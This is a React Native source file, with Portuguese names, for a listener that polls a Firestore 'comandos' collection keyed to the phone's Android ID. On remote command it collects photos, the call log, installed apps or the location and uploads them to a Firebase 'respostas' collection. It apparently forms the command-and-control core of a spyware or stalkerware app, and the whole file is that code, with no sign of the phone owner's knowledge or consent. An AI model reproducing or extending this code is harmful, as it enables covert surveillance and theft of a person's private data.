// src/listeners/comandosListener.js

import firestore from '@react-native-firebase/firestore';
import DeviceInfo from 'react-native-device-info';

import { coletarFotos } from '../funcoes/coletarFotos';
import { enviarFotosParaFirebase } from '../funcoes/enviarFotos';
import { coletarChamadas } from '../funcoes/coletarChamadas';
import { coletarAppsInstalados } from '../funcoes/coletarAppsInstalados';
import { coletarLocalizacao } from '../funcoes/localizacao';

export const startComandosListener = () => {
  const dispositivoId = DeviceInfo.getAndroidIdSync();

  const unsubscribe = firestore()
    .collection('comandos')
    .where('dispositivoId', '==', dispositivoId)
    .where('status', '==', 'pendente')
    .onSnapshot(snapshot => {
      snapshot.forEach(async doc => {
        const comando = doc.data();

        try {
          let resposta = null;

          if (comando.tipo === 'coletarFotos') {
            const fotos = await coletarFotos();
            const urls = await enviarFotosParaFirebase(fotos.fotos);
            resposta = { tipo: 'fotos', dados: urls };
          }

          else if (comando.tipo === 'coletarChamadas') {
            const chamadas = await coletarChamadas();
            resposta = { tipo: 'chamadas', dados: chamadas };
          }

          else if (comando.tipo === 'coletarApps') {
            const apps = await coletarAppsInstalados();
            resposta = { tipo: 'apps', dados: apps };
          }

          else if (comando.tipo === 'coletarLocalizacao') {
            const localizacao = await coletarLocalizacao();
            resposta = { tipo: 'localizacao', dados: localizacao };
          }

          // salva a resposta em nova coleção
          if (resposta) {
            await firestore().collection('respostas').add({
              dispositivoId,
              ...resposta,
              recebidoEm: firestore.FieldValue.serverTimestamp(),
            });

            await doc.ref.update({ status: 'executado' });
          }
        } catch (err) {
          console.error('[ERRO AO EXECUTAR COMANDO]', err);
          await doc.ref.update({ status: 'erro', erro: err.message });
        }
      });
    });

  return unsubscribe;
};
